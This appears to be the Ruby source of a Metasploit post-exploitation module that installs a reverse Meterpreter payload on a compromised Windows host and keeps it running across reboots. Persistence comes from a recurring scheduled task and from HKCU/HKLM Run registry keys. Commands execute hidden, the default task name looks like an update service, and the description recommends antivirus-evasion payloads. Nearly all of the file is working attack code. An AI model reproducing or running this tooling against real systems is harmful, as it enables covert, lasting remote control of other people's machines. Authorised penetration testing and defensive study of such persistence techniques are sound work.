##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Exploit::EXE

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Persistent Payload Installer',
      'Description'   => %q{
        This Module will create a boot persistent reverse Meterpreter session by
        installing on the target host the payload as a script that will be executed
        at user logon or system startup depending on privilege and selected startup
        method. For best performance, set a EXE::Custom payload of either a .exe or .bat file generated with AV evasion techniques. Additionally set your own payload handler. 
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Ben Turner',
          'Carlos Perez <carlos_perez[at]darkoperator.com>'
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [ [ 'Windows', {} ] ],
      'DefaultTarget' => 0,
      'DisclosureDate'=> "Mar 19 2015"
    ))

    register_options(
      [
        OptInt.new('DELAY', [true, 'Delay in minutes for persistent payload to reconnect.', 2]),
        OptString.new('NAME', [true, 'Name of the scheduled task and registry key.', 'update-svc-msf']),
        OptBool.new('UNINSTALL', [false, 'Set this option if the persistence is to be removed.']),
      ], self.class)
  end

  # Exploit Method for when exploit command is issued

  def exploit
    print_status("Running module against #{sysinfo['Computer']}")
    delay = datastore['DELAY']
    name = datastore['NAME']
    unin = datastore['UNINSTALL']
    cusext = ::File.extname(datastore['EXE::Custom'])
    execus = datastore['EXE::Custom'].to_s
    host,port = session.session_host, session.session_port

    # If the uninstall flag is set, remove the persistence
    if unin == true
      print_status("Removing scheduled task from #{sysinfo['Computer']}")
      run_cmd("schtasks /delete /f /tn #{name}")
      delete_reg("HKCU", name)
      delete_reg("HKLM", name)

    else
      print_status("To remove persistence set UNINSTALL => true")
      unless execus.empty?
        exe = get_custom_exe
      else
        exe = generate_payload_exe
      end

      # uploads the payload to the host
      script_on_target = write_script_to_target(exe, cusext)

      # exit the module because we failed to write the file on the target host.
      return unless script_on_target

      # install new scheduled tasks (removes any previously installed tasks first) 
      print_status("Running module against #{sysinfo['Computer']}")
      run_cmd("schtasks /delete /f /tn #{name}")
      run_cmd("schtasks /create /sc minute /mo #{delay} /tn #{name} /tr #{script_on_target}")

      # attempts to write the registry values to the system
      write_to_reg("HKCU", script_on_target, name)
      write_to_reg("HKLM", script_on_target, name)
    end
  end

  ##
  # uploads the payload to the host with the correct extension
  ##

  def write_script_to_target(payloadsource, ext)
    tempdir = datastore['PATH'] || session.sys.config.getenv('TEMP')
    tempfile = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ext

    begin
      write_file(tempfile, payloadsource)
      print_good("Persistent Script written to #{tempfile}")
      tempfile = tempfile.gsub(/\\/, '\\')      # Escape windows pathname separators.
    rescue
      print_error("Could not write the payload on the target hosts.")
      # return nil since we could not write the file on the target host.
      tempfile = nil
    end
    return tempfile
  end

  ##
  # The write registry function
  ##

  def write_to_reg(key, script_on_target, registry_value)
    nam = registry_value
    key_path = "#{key.to_s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    print_status("Installing key into autorun: #{key_path}\\#{nam}")
    if key && registry_setvaldata(key_path, nam, script_on_target, "REG_SZ")
      print_good("Installed key into autorun: #{key_path}\\#{nam}")
      return true
    else
      print_error("Failed to make entry in the registry for persistence: #{key_path}\\#{nam}")
    end
    false
  end

  ##
  # The delete registry function
  ##

  def delete_reg(key, registry_value)
    nam = registry_value
    key_path = "#{key.to_s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    print_status("Removing key from autorun: #{key_path}\\#{nam}")
    if key && registry_deletekey(key_path, nam)
      print_good("Removed key from autorun: #{key_path}\\#{nam}")
      return true
    else
      print_error("Failed to remove entry in the registry: #{key_path}\\#{nam}")
    end
    false
  end

  ##
  # The api shellexecute function
  ##

  def run_cmd(cmd)
    process = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
    res = ""
    while (d = process.channel.read)
      break if d == ""
      res << d
    end
    process.channel.close
    process.close
    return res
  end

end
